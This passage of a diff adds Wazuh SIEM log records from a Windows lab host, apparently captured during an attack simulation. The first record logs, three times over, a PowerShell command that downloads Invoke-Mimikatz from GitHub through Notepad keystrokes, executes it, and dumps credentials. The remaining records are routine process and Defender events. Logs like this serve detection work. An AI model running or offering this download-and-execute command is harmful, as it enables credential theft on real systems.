+                                "newProcessName": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+                                "targetLogonId": "0x0",
+                                "subjectUserSid": "S-1-5-21-3827095766-909782368-2839298323-1001",
+                                "processId": "0x9cc",
+                                "commandLine": "\\\"powershell.exe\\\" &amp; {$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\\\Software\\\\Microsoft\\\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr}",
+                                "targetUserSid": "S-1-0-0",
+                                "subjectUserName": "AmineMSc"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-21-3827095766-909782368-2839298323-1001\r\n\tAccount Name:\t\tAmineMSc\r\n\tAccount Domain:\t\tWIN-C1OEL3I2PV8\r\n\tLogon ID:\t\t0x670C2\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x143c\r\n\tNew Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-12288\r\n\tCreator Process ID:\t0x9cc\r\n\tCreator Process Name:\tC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tProcess Command Line:\t\"powershell.exe\" & {$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr}\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:24:42.7498269Z",
+                                "eventRecordID": "29644",
+                                "threadID": "9504",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 96,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:24:42.7498269Z\",\"eventRecordID\":\"29644\",\"processID\":\"4\",\"threadID\":\"9504\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-3827095766-909782368-2839298323-1001\\r\\n\\tAccount Name:\\t\\tAmineMSc\\r\\n\\tAccount Domain:\\t\\tWIN-C1OEL3I2PV8\\r\\n\\tLogon ID:\\t\\t0x670C2\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-0-0\\r\\n\\tAccount Name:\\t\\t-\\r\\n\\tAccount Domain:\\t\\t-\\r\\n\\tLogon ID:\\t\\t0x0\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0x143c\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-12288\\r\\n\\tCreator Process ID:\\t0x9cc\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\r\\n\\tProcess Command Line:\\t\\\"powershell.exe\\\" & {$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\\\Software\\\\Microsoft\\\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr}\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-21-3827095766-909782368-2839298323-1001\",\"subjectUserName\":\"AmineMSc\",\"subjectDomainName\":\"WIN-C1OEL3I2PV8\",\"subjectLogonId\":\"0x670c2\",\"newProcessId\":\"0x143c\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x9cc\",\"commandLine\":\"\\\\\\\"powershell.exe\\\\\\\" &amp; {$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr}\",\"targetUserSid\":\"S-1-0-0\",\"targetLogonId\":\"0x0\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\WindowsPowerShell\\\\\\\\v1.0\\\\\\\\powershell.exe\",\"mandatoryLabel\":\"S-1-16-12288\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:24:43.980Z",
+                    "location": "EventChannel",
+                    "id": "1778603083.3260516",
+                    "timestamp": "2026-05-12T16:24:43.980+0000"
+                },
+                "sort": [
+                    1778603083980
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "ZhcBHZ4BTkZw-244UwPa",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\svchost.exe",
+                                "subjectDomainName": "WORKGROUP",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0x53c",
+                                "mandatoryLabel": "S-1-16-12288",
+                                "newProcessName": "C:\\\\Windows\\\\System32\\\\SecurityHealth\\\\10.0.29554.1001-0\\\\SecurityHealthHost.exe",
+                                "targetLogonId": "0x670c2",
+                                "targetUserName": "AmineMSc",
+                                "subjectUserSid": "S-1-5-18",
+                                "processId": "0x3bc",
+                                "targetDomainName": "WIN-C1OEL3I2PV8",
+                                "commandLine": "\\\\\\\\?\\\\C:\\\\Windows\\\\System32\\\\SecurityHealth\\\\10.0.29554.1001-0\\\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding",
+                                "targetUserSid": "S-1-5-21-3827095766-909782368-2839298323-1001",
+                                "subjectUserName": "WIN-C1OEL3I2PV8$"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWIN-C1OEL3I2PV8$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-5-21-3827095766-909782368-2839298323-1001\r\n\tAccount Name:\t\tAmineMSc\r\n\tAccount Domain:\t\tWIN-C1OEL3I2PV8\r\n\tLogon ID:\t\t0x670C2\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0x53c\r\n\tNew Process Name:\tC:\\Windows\\System32\\SecurityHealth\\10.0.29554.1001-0\\SecurityHealthHost.exe\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-12288\r\n\tCreator Process ID:\t0x3bc\r\n\tCreator Process Name:\tC:\\Windows\\System32\\svchost.exe\r\n\tProcess Command Line:\t\\\\?\\C:\\Windows\\System32\\SecurityHealth\\10.0.29554.1001-0\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:24:42.7725367Z",
+                                "eventRecordID": "29645",
+                                "threadID": "9504",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 97,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Security-Auditing\",\"providerGuid\":\"{54849625-5478-4994-a5ba-3e3b0328c30d}\",\"eventID\":\"4688\",\"version\":\"2\",\"level\":\"0\",\"task\":\"13312\",\"opcode\":\"0\",\"keywords\":\"0x8020000000000000\",\"systemTime\":\"2026-05-12T16:24:42.7725367Z\",\"eventRecordID\":\"29645\",\"processID\":\"4\",\"threadID\":\"9504\",\"channel\":\"Security\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"AUDIT_SUCCESS\",\"message\":\"\\\"A new process has been created.\\r\\n\\r\\nCreator Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-18\\r\\n\\tAccount Name:\\t\\tWIN-C1OEL3I2PV8$\\r\\n\\tAccount Domain:\\t\\tWORKGROUP\\r\\n\\tLogon ID:\\t\\t0x3E7\\r\\n\\r\\nTarget Subject:\\r\\n\\tSecurity ID:\\t\\tS-1-5-21-3827095766-909782368-2839298323-1001\\r\\n\\tAccount Name:\\t\\tAmineMSc\\r\\n\\tAccount Domain:\\t\\tWIN-C1OEL3I2PV8\\r\\n\\tLogon ID:\\t\\t0x670C2\\r\\n\\r\\nProcess Information:\\r\\n\\tNew Process ID:\\t\\t0x53c\\r\\n\\tNew Process Name:\\tC:\\\\Windows\\\\System32\\\\SecurityHealth\\\\10.0.29554.1001-0\\\\SecurityHealthHost.exe\\r\\n\\tToken Elevation Type:\\tTokenElevationTypeDefault (1)\\r\\n\\tMandatory Label:\\t\\tS-1-16-12288\\r\\n\\tCreator Process ID:\\t0x3bc\\r\\n\\tCreator Process Name:\\tC:\\\\Windows\\\\System32\\\\svchost.exe\\r\\n\\tProcess Command Line:\\t\\\\\\\\?\\\\C:\\\\Windows\\\\System32\\\\SecurityHealth\\\\10.0.29554.1001-0\\\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding\\r\\n\\r\\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\\r\\n\\r\\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\\r\\n\\r\\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\\r\\n\\r\\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\\\"\"},\"eventdata\":{\"subjectUserSid\":\"S-1-5-18\",\"subjectUserName\":\"WIN-C1OEL3I2PV8$\",\"subjectDomainName\":\"WORKGROUP\",\"subjectLogonId\":\"0x3e7\",\"newProcessId\":\"0x53c\",\"newProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\SecurityHealth\\\\\\\\10.0.29554.1001-0\\\\\\\\SecurityHealthHost.exe\",\"tokenElevationType\":\"%%1936\",\"processId\":\"0x3bc\",\"commandLine\":\"\\\\\\\\\\\\\\\\?\\\\\\\\C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\SecurityHealth\\\\\\\\10.0.29554.1001-0\\\\\\\\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding\",\"targetUserSid\":\"S-1-5-21-3827095766-909782368-2839298323-1001\",\"targetUserName\":\"AmineMSc\",\"targetDomainName\":\"WIN-C1OEL3I2PV8\",\"targetLogonId\":\"0x670c2\",\"parentProcessName\":\"C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\svchost.exe\",\"mandatoryLabel\":\"S-1-16-12288\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:24:43.996Z",
+                    "location": "EventChannel",
+                    "id": "1778603083.3272444",
+                    "timestamp": "2026-05-12T16:24:43.996+0000"
+                },
+                "sort": [
+                    1778603083996
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "ZxcBHZ4BTkZw-244bwNN",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "data": "Windows Defender, SECURITY_PRODUCT_STATE_ON"
+                            },
+                            "system": {
+                                "eventID": "15",
+                                "keywords": "0x80000000000000",
+                                "level": "4",
+                                "channel": "Application",
+                                "opcode": "0",
+                                "message": "\"Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.\"",
+                                "version": "0",
+                                "systemTime": "2026-05-12T16:24:49.8047749Z",
+                                "eventRecordID": "694",
+                                "threadID": "0",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "0",
+                                "processID": "9776",
+                                "severityValue": "INFORMATION",
+                                "providerName": "SecurityCenter"
+                            }
+                        }
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"SecurityCenter\",\"eventID\":\"15\",\"version\":\"0\",\"level\":\"4\",\"task\":\"0\",\"opcode\":\"0\",\"keywords\":\"0x80000000000000\",\"systemTime\":\"2026-05-12T16:24:49.8047749Z\",\"eventRecordID\":\"694\",\"processID\":\"9776\",\"threadID\":\"0\",\"channel\":\"Application\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"INFORMATION\",\"message\":\"\\\"Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.\\\"\"},\"eventdata\":{\"data\":\"Windows Defender, SECURITY_PRODUCT_STATE_ON\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:24:49.954Z",
+                    "location": "EventChannel",
+                    "id": "1778603089.3272444",
+                    "timestamp": "2026-05-12T16:24:49.954+0000"
+                },
+                "sort": [
+                    1778603089954
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "aBcBHZ4BTkZw-244cwM4",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "data": "Windows Defender, SECURITY_PRODUCT_STATE_ON"
+                            },
+                            "system": {
+                                "eventID": "15",
+                                "keywords": "0x80000000000000",
+                                "level": "4",
+                                "channel": "Application",
+                                "opcode": "0",
+                                "message": "\"Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.\"",
+                                "version": "0",
+                                "systemTime": "2026-05-12T16:24:53.1803626Z",
+                                "eventRecordID": "695",
+                                "threadID": "0",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "0",
+                                "processID": "9776",
+                                "severityValue": "INFORMATION",
+                                "providerName": "SecurityCenter"
+                            }
+                        }
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
+                    "full_log": "{\"win\":{\"system\":{\"providerName\":\"SecurityCenter\",\"eventID\":\"15\",\"version\":\"0\",\"level\":\"4\",\"task\":\"0\",\"opcode\":\"0\",\"keywords\":\"0x80000000000000\",\"systemTime\":\"2026-05-12T16:24:53.1803626Z\",\"eventRecordID\":\"695\",\"processID\":\"9776\",\"threadID\":\"0\",\"channel\":\"Application\",\"computer\":\"WIN-C1OEL3I2PV8\",\"severityValue\":\"INFORMATION\",\"message\":\"\\\"Updated Windows Defender status successfully to SECURITY_PRODUCT_STATE_ON.\\\"\"},\"eventdata\":{\"data\":\"Windows Defender, SECURITY_PRODUCT_STATE_ON\"}}}",
+                    "input": {
+                        "type": "log"
+                    },
+                    "@timestamp": "2026-05-12T16:24:53.348Z",
+                    "location": "EventChannel",
+                    "id": "1778603093.3272444",
+                    "timestamp": "2026-05-12T16:24:53.348+0000"
+                },
+                "sort": [
+                    1778603093348
+                ]
+            },
+            {
+                "_index": "wazuh-archives-4.x-2026.05.12",
+                "_id": "axcBHZ4BTkZw-2441APu",
+                "_score": null,
+                "_source": {
+                    "agent": {
+                        "ip": "192.168.64.6",
+                        "name": "Windows-TARGET",
+                        "id": "002"
+                    },
+                    "manager": {
+                        "name": "wazuh.manager"
+                    },
+                    "data": {
+                        "win": {
+                            "eventdata": {
+                                "subjectLogonId": "0x3e7",
+                                "parentProcessName": "C:\\\\Windows\\\\System32\\\\svchost.exe",
+                                "subjectDomainName": "WORKGROUP",
+                                "tokenElevationType": "%%1936",
+                                "newProcessId": "0xff8",
+                                "mandatoryLabel": "S-1-16-16384",
+                                "newProcessName": "C:\\\\Windows\\\\System32\\\\taskhostw.exe",
+                                "targetLogonId": "0x0",
+                                "subjectUserSid": "S-1-5-18",
+                                "processId": "0x554",
+                                "commandLine": "taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly",
+                                "targetUserSid": "S-1-0-0",
+                                "subjectUserName": "WIN-C1OEL3I2PV8$"
+                            },
+                            "system": {
+                                "eventID": "4688",
+                                "keywords": "0x8020000000000000",
+                                "providerGuid": "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+                                "level": "0",
+                                "channel": "Security",
+                                "opcode": "0",
+                                "message": "\"A new process has been created.\r\n\r\nCreator Subject:\r\n\tSecurity ID:\t\tS-1-5-18\r\n\tAccount Name:\t\tWIN-C1OEL3I2PV8$\r\n\tAccount Domain:\t\tWORKGROUP\r\n\tLogon ID:\t\t0x3E7\r\n\r\nTarget Subject:\r\n\tSecurity ID:\t\tS-1-0-0\r\n\tAccount Name:\t\t-\r\n\tAccount Domain:\t\t-\r\n\tLogon ID:\t\t0x0\r\n\r\nProcess Information:\r\n\tNew Process ID:\t\t0xff8\r\n\tNew Process Name:\tC:\\Windows\\System32\\taskhostw.exe\r\n\tToken Elevation Type:\tTokenElevationTypeDefault (1)\r\n\tMandatory Label:\t\tS-1-16-16384\r\n\tCreator Process ID:\t0x554\r\n\tCreator Process Name:\tC:\\Windows\\System32\\svchost.exe\r\n\tProcess Command Line:\ttaskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly\r\n\r\nToken Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.\r\n\r\nType 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.\r\n\r\nType 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.\r\n\r\nType 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.\"",
+                                "version": "2",
+                                "systemTime": "2026-05-12T16:25:12.7995137Z",
+                                "eventRecordID": "29649",
+                                "threadID": "7212",
+                                "computer": "WIN-C1OEL3I2PV8",
+                                "task": "13312",
+                                "processID": "4",
+                                "severityValue": "AUDIT_SUCCESS",
+                                "providerName": "Microsoft-Windows-Security-Auditing"
+                            }
+                        }
+                    },
+                    "rule": {
+                        "firedtimes": 98,
+                        "mail": false,
+                        "level": 3,
+                        "description": "A process was created.",
+                        "groups": [
+                            "windows",
+                            " WEF"
+                        ],
+                        "id": "67027"
+                    },
+                    "decoder": {
+                        "name": "windows_eventchannel"
+                    },
